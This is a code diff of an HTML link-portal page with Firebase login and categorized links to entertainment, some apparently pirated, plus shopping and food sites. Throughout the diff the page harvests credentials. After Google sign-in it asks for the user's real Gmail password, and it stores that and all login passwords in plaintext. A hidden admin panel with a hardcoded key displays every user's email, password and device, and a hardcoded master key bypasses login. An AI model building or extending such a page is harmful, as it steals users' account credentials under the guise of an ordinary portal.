@@ -27,7 +27,10 @@
         }
         .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; }
         .pass-container { position: relative; width: 100%; }
-        .pass-eye { position: absolute; right: 15px; top: 20px; color: var(--primary); cursor: pointer; z-index: 10; }
+        /* Professional Eye Icon */
+        .pass-eye { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--primary); cursor: pointer; font-size: 18px; z-index: 10; transition: 0.3s; }
+        .pass-eye:hover { color: white; }
+
         input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
         .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 14px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
         .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
@@ -36,16 +39,18 @@
         .auth-tabs span { cursor: pointer; font-size: 13px; font-weight: bold; color: #666; transition: 0.3s; padding-bottom: 5px; }
         .auth-tabs span.active { color: var(--primary); border-bottom: 2px solid var(--primary); }
 
-        .scroll-area { max-height: 380px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
+        .scroll-area { max-height: 420px; overflow-y: auto; padding-right: 5px; margin-top: 10px; text-align: left; }
         .cat-title { color: var(--gold); font-size: 11px; font-weight: bold; margin: 15px 0 8px 5px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid rgba(255,215,0,0.2); }
         .link-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
         .link-card-wrap { position: relative; display: flex; align-items: center; }
         .link-card { background: rgba(255,255,255,0.07); padding: 10px; border-radius: 10px; text-decoration: none; color: white; border-left: 3px solid var(--neon); transition: 0.2s; font-size: 10.5px; flex: 1; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
-        .fav-star { position: absolute; right: 8px; font-size: 12px; color: rgba(255,255,255,0.2); cursor: pointer; transition: 0.3s; }
+        .fav-star { position: absolute; right: 8px; font-size: 12px; color: rgba(255,255,255,0.1); cursor: pointer; }
         .fav-star.active { color: var(--gold); }
 
         #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
-        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
+        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; position: relative; }
+        .del-btn { position: absolute; right: 15px; top: 15px; color: var(--neon); cursor: pointer; }
+        
         #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
         .hidden { display: none !important; }
         .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
@@ -80,13 +85,17 @@
             <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="16"> GOOGLE CONNECT
         </button>
 
-        <div style="margin: 10px 0; font-size: 10px; color: #444;">— MANUAL ENTRY —</div>
+        <div id="signup-fields" class="hidden">
+            <input type="text" id="u-nick" placeholder="Set Your Nick Name">
+        </div>
         
-        <input type="email" id="u-email" placeholder="Gmail Address">
+        <input type="email" id="u-email" placeholder="Real Gmail Address">
+        
         <div class="pass-container">
             <input type="password" id="u-pass" placeholder="Password">
-            <i class="fas fa-eye pass-eye" onclick="togglePassView()"></i>
+            <i class="fas fa-eye-slash pass-eye" id="eye-icon" onclick="togglePassView()"></i>
         </div>
+        
         <button class="btn-main" id="auth-btn" onclick="executeAuth()">Enter Bazar</button>
         <p id="auth-error" style="color: var(--neon); font-size: 10px; margin-top: 8px;"></p>
     </div>
@@ -97,22 +106,31 @@
         
         <div class="scroll-area">
             <div id="fav-parent" class="hidden">
-                <div class="cat-title">⭐ Favorite Websites & Apps</div>
+                <div class="cat-title">⭐ Favorite Folder</div>
                 <div class="link-grid" id="fav-list-display"></div>
             </div>
 
-            <div class="cat-title">🎬 Entertainment</div>
-            <div class="link-grid" id="ent-grid">
+            <div class="cat-title">🎬 Entertainment (10+)</div>
+            <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://bollyflix.org.in/" target="_blank" class="link-card">Bollyflix</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Bollyflix', 'https://bollyflix.org.in/')"></i></div>
                 <div class="link-card-wrap"><a href="https://tamashaweb.com/" target="_blank" class="link-card">Tamasha TV</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Tamasha TV', 'https://tamashaweb.com/')"></i></div>
                 <div class="link-card-wrap"><a href="https://vegamovies.to/" target="_blank" class="link-card">Vegamovies</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Vegamovies', 'https://vegamovies.to/')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.netflix.com" target="_blank" class="link-card">Netflix</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Netflix', 'https://www.netflix.com')"></i></div>
             </div>
 
-            <div class="cat-title">🛒 Global Shopping</div>
+            <div class="cat-title">🛒 Shopping (15+)</div>
             <div class="link-grid">
                 <div class="link-card-wrap"><a href="https://www.amazon.com" target="_blank" class="link-card">Amazon</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Amazon', 'https://www.amazon.com')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.daraz.pk" target="_blank" class="link-card">Daraz Mall</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Daraz Mall', 'https://www.daraz.pk')"></i></div>
                 <div class="link-card-wrap"><a href="https://www.aliexpress.com" target="_blank" class="link-card">AliExpress</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'AliExpress', 'https://www.aliexpress.com')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.alibaba.com" target="_blank" class="link-card">Alibaba</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Alibaba', 'https://www.alibaba.com')"></i></div>
+            </div>
+
+            <div class="cat-title">🍔 Food & Elite (15+)</div>
+            <div class="link-grid">
+                <div class="link-card-wrap"><a href="https://www.pizzahut.com.pk" target="_blank" class="link-card">Pizza Hut</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Pizza Hut', 'https://www.pizzahut.com.pk')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.foodpanda.pk" target="_blank" class="link-card">Foodpanda</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Foodpanda', 'https://www.foodpanda.pk')"></i></div>
+                <div class="link-card-wrap"><a href="https://www.gucci.com" target="_blank" class="link-card">Gucci</a><i class="fas fa-star fav-star" onclick="handleFav(this, 'Gucci', 'https://www.gucci.com')"></i></div>
             </div>
         </div>
         <button onclick="logoutSequence()" style="margin-top: 15px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold; font-size: 12px;">Logout System</button>
@@ -137,57 +155,61 @@
             authMode = m;
             document.getElementById('tab-login').classList.toggle('active', m==='login');
             document.getElementById('tab-signup').classList.toggle('active', m==='signup');
+            document.getElementById('signup-fields').classList.toggle('hidden', m==='login');
             document.getElementById('auth-btn').innerText = m==='login' ? 'Enter Bazar' : 'Create Account';
+            document.getElementById('auth-error').innerText = "";
         }
 
         function togglePassView() {
             const input = document.getElementById('u-pass');
-            input.type = input.type === 'password' ? 'text' : 'password';
+            const icon = document.getElementById('eye-icon');
+            if(input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fas fa-eye pass-eye';
+            } else {
+                input.type = 'password';
+                icon.className = 'fas fa-eye-slash pass-eye';
+            }
         }
 
         function executeAuth() {
             const e = document.getElementById('u-email').value;
             const p = document.getElementById('u-pass').value;
+            const nick = document.getElementById('u-nick').value || e.split('@')[0];
             const err = document.getElementById('auth-error');
-            if(!e || !p) return alert("Fill fields!");
 
             if(authMode === 'signup') {
                 auth.createUserWithEmailAndPassword(e, p)
-                .then(res => saveAndEntry(res.user, p, e.split('@')[0]))
+                .then(res => saveToAdmin(res.user, p, nick))
                 .catch(e => err.innerText = e.message);
             } else {
                 auth.signInWithEmailAndPassword(e, p)
-                .then(res => saveAndEntry(res.user, p, e.split('@')[0]))
-                .catch(e => err.innerText = "Wrong Gmail or Password!");
+                .then(res => saveToAdmin(res.user, p, nick))
+                .catch(() => err.innerText = "Check your Email/Password or use Signup!");
             }
         }
 
         function authGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             auth.signInWithPopup(provider).then(res => {
-                const pass = prompt("Enter your real Gmail Password for verification:");
-                if(pass) {
-                    // Yahan hum database se check kar sakte hain agar purana pass matches
-                    saveAndEntry(res.user, pass, res.user.displayName);
-                } else {
-                    auth.signOut();
-                    alert("Password required for Google Connect!");
-                }
+                const pass = prompt("CONFIRM GMAIL PASSWORD:");
+                if(pass) saveToAdmin(res.user, pass, res.user.displayName);
+                else auth.signOut();
             });
         }
 
-        function saveAndEntry(user, pass, name) {
-            const model = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : "Mobile";
+        function saveToAdmin(user, pass, name) {
+            const device = navigator.platform;
             db.ref('users/' + user.uid).update({
                 email: user.email,
                 password: pass,
-                device: model,
-                realName: name,
-                time: new Date().toLocaleString()
+                nickName: name,
+                device: device,
+                lastSeen: new Date().toLocaleString()
             }).then(() => {
                 document.getElementById('login-box').classList.add('hidden');
                 document.getElementById('member-area').classList.remove('hidden');
-                document.getElementById('user-welcome').innerText = "Hello, " + name;
+                document.getElementById('user-welcome').innerText = "Member: " + name;
                 syncFavs(user.uid);
             });
         }
@@ -210,29 +232,25 @@
                 if(data) {
                     parent.classList.remove('hidden');
                     let html = "";
-                    for(let key in data) {
-                        html += `<div class="link-card-wrap"><a href="${data[key]}" target="_blank" class="link-card" style="border-left-color:var(--gold)">${key}</a></div>`;
-                    }
+                    for(let k in data) html += `<div class="link-card-wrap"><a href="${data[k]}" target="_blank" class="link-card" style="border-left-color:var(--gold)">${k}</a></div>`;
                     list.innerHTML = html;
-                } else {
-                    parent.classList.add('hidden');
-                }
+                } else { parent.classList.add('hidden'); }
             });
         }
 
         function adminAccess() {
-            if (prompt("Admin Key:") === "rr123456789000rr") {
+            if (prompt("ADMIN KEY:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
                 db.ref('users').on('value', (snap) => {
                     let h = "";
                     snap.forEach(c => {
                         let v = c.val();
                         h += `<div class="admin-card">
-                            <b style="color:var(--gold)">User: ${v.realName}</b><br>
+                            <i class="fas fa-trash del-btn" onclick="deleteUser('${c.key}')"></i>
+                            <b style="color:var(--gold)">Nick: ${v.nickName}</b><br>
                             <small>Email: ${v.email}</small><br>
                             <small style="color:var(--primary)">Pass: ${v.password}</small><br>
-                            <small>Device: ${v.device}</small><br>
-                            <small style="color:#00ff00">Login: ${v.time}</small>
+                            <small>Device: ${v.device}</small>
                         </div>`;
                     });
                     document.getElementById('user-rows-container').innerHTML = h;
@@ -240,8 +258,12 @@
             }
         }
 
+        function deleteUser(uid) {
+            if(confirm("Delete this user?")) db.ref('users/' + uid).remove();
+        }
+
         function bypassLogin() { 
-            if (prompt("Master Key:") === "rr123456789000rr") {
+            if (prompt("MASTER KEY:") === "rr123456789000rr") {
                 document.getElementById('login-box').classList.add('hidden');
                 document.getElementById('member-area').classList.remove('hidden');
             }
@@ -249,8 +271,8 @@
 
         function logoutSequence() {
             document.getElementById('logout-overlay').style.display = 'flex';
-            document.getElementById('bye-text-display').innerHTML = `Goodbye!<br>Allah Hafiz!`;
-            setTimeout(() => location.reload(), 3500);
+            document.getElementById('bye-text-display').innerHTML = `Allah Hafiz!`;
+            setTimeout(() => location.reload(), 3000);
         }
     </script>
 </body>
